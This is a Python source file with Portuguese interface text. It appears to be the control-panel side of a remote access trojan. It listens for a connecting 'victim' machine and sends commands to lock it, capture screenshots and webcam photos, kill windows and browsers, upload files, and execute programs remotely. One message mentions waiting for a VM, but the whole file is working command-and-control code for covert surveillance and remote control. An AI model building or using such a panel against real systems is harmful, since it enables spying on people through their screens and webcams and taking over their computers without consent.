import socket
import tkinter as tk
import os
from PIL import Image, ImageTk
import io
from colorama import Fore, Style, init

init(autoreset=True)

def enviar_arquivo_para_alvo(conexao):
    caminho = input(f"{Fore.CYAN}Digite o caminho completo do arquivo no SEU PC: ").strip()
    if os.path.exists(caminho):
        nome_curto = os.path.basename(caminho)
        with open(caminho, "rb") as f:
            dados = f.read()
            
        conexao.send(nome_curto.ljust(64).encode())
        conexao.send(str(len(dados)).ljust(16).encode())
        conexao.sendall(dados)
        print(f"{Fore.GREEN}[+] Arquivo enviado com sucesso!")
    else:
        print(f"{Fore.RED}[!] Arquivo não encontrado.")

def exibir_imagem_recebida(conexao):
    try:
        print(f"{Fore.YELLOW}[*] Recebendo imagem...")
        tamanho_data = conexao.recv(16).decode().strip()
        if not tamanho_data: 
            print(f"{Fore.RED}[!] Erro: Nenhum dado de tamanho recebido.")
            return
        tamanho_final = int(tamanho_data)
        
        bytes_recebidos = b""
        while len(bytes_recebidos) < tamanho_final:
            chunk = conexao.recv(4096)
            if not chunk: break
            bytes_recebidos += chunk
        
        nova_janela = tk.Toplevel()
        nova_janela.title("CAPTURA REMOTA - ALVO")
        nova_janela.attributes("-topmost", True) 
        
        img = Image.open(io.BytesIO(bytes_recebidos))
        img.thumbnail((800, 600)) 
        
        img_tk = ImageTk.PhotoImage(img)
        label = tk.Label(nova_janela, image=img_tk)
        label.image = img_tk 
        label.pack()
        print(f"{Fore.GREEN}[+] Imagem exibida com sucesso!")
    except Exception as e:
        print(f"{Fore.RED}[!] Erro ao processar imagem: {e}")
IP_SERVER = '0.0.0.0' 
PORTA = 9999

def iniciar_painel():
    root = tk.Tk()
    root.withdraw()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((IP_SERVER, PORTA))
    s.listen(1)
    
    print(f"{Fore.GREEN}[*] Painel de Controle Ativo na porta {PORTA}")
    print(f"{Fore.YELLOW}[*] Aguardando conexão da VM (Alvo)...")
    
    conexao, addr = s.accept()
    print(f"\n{Fore.GREEN}{Style.BRIGHT}[!] ALVO CONECTADO: {addr}")

    while True:
        print(f"\n{Fore.CYAN}--- COMANDOS DISPONÍVEIS ---")
        print(f"{Fore.WHITE}[1] lock          -> Bloquear Alvo")
        print(f"{Fore.WHITE}[2] unlock        -> Destravar Tudo")
        print(f"{Fore.WHITE}[3] screenshot    -> Capturar Tela (Abre foto aqui)")
        print(f"{Fore.WHITE}[4] webcam        -> Foto da Webcam (Abre foto aqui)")
        print(f"{Fore.WHITE}[5] kill_windows  -> Fechar janelas")
        print(f"{Fore.WHITE}[6] kill_browser  -> Matar navegadores")
        print(f"{Fore.WHITE}[7] upload        -> Enviar arquivo do seu PC para a Vítima")
        print(f"{Fore.WHITE}[8] execute       -> Executar um arquivo pelo nome na Vítima")
        print(f"{Fore.MAGENTA}[99] http(s)://.. -> Abre qualquer link que é digitado")
        print(f"{Fore.RED}[0] sair")
        
        escolha = input(f"\n{Fore.YELLOW}Digite o número > ").strip()

        cmd = ""
        if escolha == "1": cmd = "lock"
        elif escolha == "2": cmd = "unlock"
        elif escolha == "3": cmd = "screenshot"
        elif escolha == "4": cmd = "webcam"
        elif escolha == "5": cmd = "kill_windows"
        elif escolha == "6": cmd = "kill_browser"
        elif escolha == "7":
            conexao.send("upload".encode())
            enviar_arquivo_para_alvo(conexao)
            cmd = "" 
        elif escolha == "8":
            conexao.send("execute".encode())
            nome = input(f"{Fore.CYAN}Digite o nome do arquivo para rodar lá (ex: calc.exe): ")
            conexao.send(nome.encode())
            cmd = ""
        elif escolha == "0": break
        else: cmd = escolha 

        if cmd:
            conexao.send(cmd.encode())
            print(f"{Fore.GREEN}[>] Enviado: {cmd}")
            
           
            if cmd == "screenshot" or cmd == "webcam":
                exibir_imagem_recebida(conexao)

    conexao.close()
    s.close()

if __name__ == "__main__":
    iniciar_painel()